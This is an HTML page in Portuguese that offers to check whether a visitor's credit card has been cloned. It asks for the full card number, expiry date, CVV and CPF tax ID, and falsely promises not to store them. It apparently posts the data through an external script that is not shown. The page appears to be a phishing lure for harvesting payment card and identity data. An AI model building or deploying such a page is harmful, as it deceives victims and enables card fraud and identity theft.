<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifique se seu cartão foi clonado</title>
    <link rel="stylesheet" href="t.css">
    
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GE9WTCG0JC"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-GE9WTCG0JC');
    </script>
</head>
<body>

<div class="container">
    <h1>Verifique se seu cartão foi clonado</h1>

    <div class="input-field">
        <label for="card-number">Número do cartão de crédito</label>
        <input type="text" id="card-number" maxlength="16" placeholder="Ex: 1234 5678 9123 4567">
    </div>

    <div class="input-field">
        <label for="expiry-date">Data de validade (MM/AA)</label>
        <input type="text" id="expiry-date" maxlength="5" placeholder="Ex: 12/25">
    </div>

    <div class="input-field">
        <label for="cvv">CVV</label>
        <input type="text" id="cvv" maxlength="4" placeholder="Ex: 123">
    </div>

    <div class="input-field">
        <label for="cpf">CPF</label>
        <input type="text" id="cpf" maxlength="11" placeholder="Ex: 123.456.789-10">
    </div>

    <p class="info-message">Não iremos salvar as informações do seu cartão</p>

    <button id="verify-btn" onclick="verifyCard()">Verificar</button>
</div>

<div class="popup" id="popup">
    <div class="popup-content">
        <h2>Cartão Seguro!</h2>
        <button class="close-btn" onclick="closePopup()">Fechar</button>
    </div>
</div>

<script src="t.js"></script>

</body>
</html>
